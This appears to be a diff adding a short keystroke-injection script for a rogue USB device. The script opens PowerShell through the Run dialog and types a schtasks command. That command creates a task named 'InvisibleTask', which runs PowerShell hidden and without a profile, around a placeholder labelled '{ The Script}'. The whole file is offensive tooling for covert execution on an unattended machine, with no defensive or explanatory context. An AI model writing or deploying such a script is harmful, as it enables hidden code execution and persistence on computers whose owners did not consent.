@@ -1,0 +1,7 @@
+GUI r               
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING schtasks /create /tn "InvisibleTask" /tr "powershell.exe -WindowStyle Hidden -NoProfile -Command { The Script}" /sc once /st 00:00 /f
+ENTER
